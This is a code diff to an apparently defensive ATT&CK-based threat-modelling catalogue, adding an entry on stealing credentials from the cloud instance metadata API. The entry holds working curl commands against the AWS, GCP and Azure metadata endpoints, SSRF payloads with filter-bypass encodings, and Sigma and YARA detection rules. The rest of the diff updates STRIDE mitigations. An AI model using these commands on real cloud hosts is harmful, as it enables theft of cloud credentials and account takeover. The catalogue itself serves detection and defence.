@@ -128,6 +128,65 @@ level: high`,
 }`,
     },
 
+    "T1552.005": {
+      name: "Unsecured Credentials: Cloud Instance Metadata API", tactic: "Credential Access",
+      attack: {
+        note: "Reach the link-local metadata service (169.254.169.254) — directly on a foothold, or via SSRF in a URL-fetching feature — to steal the instance role's temporary cloud credentials. IMDSv2 requires a PUT-issued token first.",
+        lang: "bash",
+        code: R`# --- AWS: IMDSv1 (token-less) — one-shot credential theft ---
+ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
+curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+# -> {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"..."}
+
+# --- AWS: IMDSv2 (token-first; works when hop-limit > 1) ---
+TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# --- GCP (service-account token) / Azure (OAuth token) ---
+curl -s -H "Metadata-Flavor: Google" \
+  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
+curl -s -H "Metadata: true" \
+  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+
+# --- Via SSRF (no shell) + bypasses for naive 169.254.169.254 filters ---
+curl "https://app/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+curl "https://app/fetch?url=http://2852039166/latest/meta-data/"          # decimal IP
+curl "https://app/fetch?url=http://[::ffff:169.254.169.254]/latest/meta-data/"  # IPv6-mapped
+curl "https://app/fetch?url=http://169.254.169.254.nip.io/latest/meta-data/"    # DNS wildcard
+
+# --- Use the stolen session ---
+aws sts get-caller-identity   # with AWS_ACCESS_KEY_ID / _SECRET_ACCESS_KEY / _SESSION_TOKEN`,
+      },
+      sigma: R`title: Cloud Instance Metadata Credential Access via Proxy/SSRF
+logsource: { category: proxy }
+detection:
+  metadata:
+    c-uri|contains:
+      - '169.254.169.254'
+      - 'metadata.google.internal'
+      - 'computeMetadata/v1'
+      - '/latest/meta-data/iam/'
+      - '[::ffff:169.254.169.254]'
+      - '2852039166'
+  from_app_tier:
+    src_ip|cidr: '10.0.0.0/8'   # requests sourced from server/app subnets, not operators
+  condition: metadata and from_app_tier
+level: high`,
+      yara: R`rule SSRF_Cloud_Metadata_Access {
+  meta:
+    description = "Payloads / tooling targeting cloud instance metadata (T1552.005)"
+  strings:
+    $imds   = "169.254.169.254" ascii
+    $awscred= "/latest/meta-data/iam/security-credentials" ascii nocase
+    $gcp    = "computeMetadata/v1/instance/service-accounts" ascii nocase
+    $azure  = "/metadata/identity/oauth2/token" ascii nocase
+    $dec    = "http://2852039166" ascii
+  condition: $imds and any of ($awscred, $gcp, $azure, $dec)
+}`,
+    },
+
     "T1557.001": {
       name: "LLMNR/NBT-NS Poisoning and SMB Relay", tactic: "Credential Access",
       attack: {
@@ -863,7 +922,7 @@ level: critical` }],
       stride: {
         S: { t: "An attacker spoofs the service to clients or peers (AiTM).", m: "mTLS, HSTS, signed tokens, certificate pinning.", ttps: ["T1557.001"] },
         T: { t: "Inputs are injected to exploit the public-facing app.", m: "Input validation, parameterised queries, WAF, patch SLAs.", ttps: ["T1190"] },
-        I: { t: "The app discloses secrets or other users' data.", m: "Least privilege, secrets manager, output encoding, authz checks.", ttps: ["T1190"] },
+        I: { t: "The app discloses secrets or other users' data, or SSRF reaches the cloud metadata API for instance-role credentials.", m: "Least privilege, secrets manager, output encoding, authz checks, SSRF egress allow-listing, enforce IMDSv2.", ttps: ["T1190", "T1552.005"] },
         D: { t: "The service is exhausted and stops serving requests.", m: "Rate limiting, autoscaling, timeouts, resource quotas.", ttps: ["T1499"] },
         E: { t: "A flaw is exploited to run with higher privilege.", m: "Least privilege, sandboxing, patch management.", ttps: ["T1068"] },
         L: { t: "The service is used as a pivot into internal systems.", m: "Egress control, segmentation, service-identity scoping.", ttps: ["T1210"] },
@@ -898,7 +957,7 @@ level: critical` }],
       label: "Host / Server / VM / Container", icon: "server",
       stride: {
         T: { t: "Code execution and persistence are established on the host.", m: "App allow-listing, EDR, task/registry auditing, signed binaries.", ttps: ["T1059.001", "T1047", "T1053.005", "T1547.001", "T1055"] },
-        I: { t: "Credentials and data are harvested from memory/disk.", m: "RunAsPPL, Credential Guard, least privilege, DLP.", ttps: ["T1003.001"] },
+        I: { t: "Credentials and data are harvested from memory/disk, or the cloud metadata API is queried for the instance role's tokens.", m: "RunAsPPL, Credential Guard, least privilege, DLP, IMDSv2 with hop-limit 1, egress-block 169.254.169.254.", ttps: ["T1003.001", "T1552.005"] },
         D: { t: "The host's data is encrypted or destroyed for impact.", m: "Immutable backups, canary files, shadow-copy protection.", ttps: ["T1486"] },
         E: { t: "A local flaw or misconfig is abused to reach SYSTEM/root.", m: "Patch, remove local admin, UAC at max, service hardening.", ttps: ["T1548.002", "T1068"] },
         L: { t: "The host is used to move laterally and exfiltrate.", m: "Host firewall, segmentation, egress monitoring.", ttps: ["T1021.002", "T1550.002", "T1048.003"] },
@@ -1037,7 +1096,7 @@ level: critical` }],
   /* ── RAPIDS scenario catalogs (R·A·P·I·D·S) ────────────────────────── */
   const RAPIDS_IT = [
     { key: "R", name: "Ransomware", icon: "bug", desc: "Phishing or edge exploit → credential theft → lateral movement → data theft (double extortion) → mass encryption and recovery inhibition.", ttps: ["T1566.001", "T1003.001", "T1021.002", "T1048.003", "T1486"] },
-    { key: "A", name: "Application Vulnerability", icon: "cpu", desc: "Exploitation of an internet-facing application (injection, deserialisation, SSRF) leading to code execution and privilege escalation.", ttps: ["T1190", "T1059.001", "T1068"] },
+    { key: "A", name: "Application Vulnerability", icon: "cpu", desc: "Exploitation of an internet-facing application (injection, deserialisation, SSRF) leading to code execution, cloud-credential theft and privilege escalation.", ttps: ["T1190", "T1552.005", "T1059.001", "T1068"] },
     { key: "P", name: "Phishing", icon: "mail", desc: "Credential-harvesting or payload lures leading to account takeover and MFA bypass.", ttps: ["T1566.001", "T1078", "T1621"] },
     { key: "I", name: "Insider Threat", icon: "user", desc: "A trusted account abuses legitimate access to collect, tamper with and exfiltrate data.", ttps: ["T1078", "T1530", "T1565", "T1048.003"] },
     { key: "D", name: "Denial of Service", icon: "network", desc: "Volumetric and application-layer attacks degrading availability of exposed services.", ttps: ["T1498", "T1499"] },
@@ -1107,6 +1166,7 @@ level: critical` }],
     "T1566.001": ["MANL", "SMRA", "M1017", "PSA"],
     "T1078": ["MFA", "AET", "UGLPA", "M1026"],
     "T1190": ["ACH", "M1050", "M1016", "NTA"],
+    "T1552.005": ["OTF", "ACH", "M1037", "RAPA"],
     "T1557.001": ["M1037", "M1030", "NTA"],
     "T1558.003": ["SPP", "M1015", "M1027", "DAM"],
     "T1003.001": ["M1043", "M1040", "SCA"],
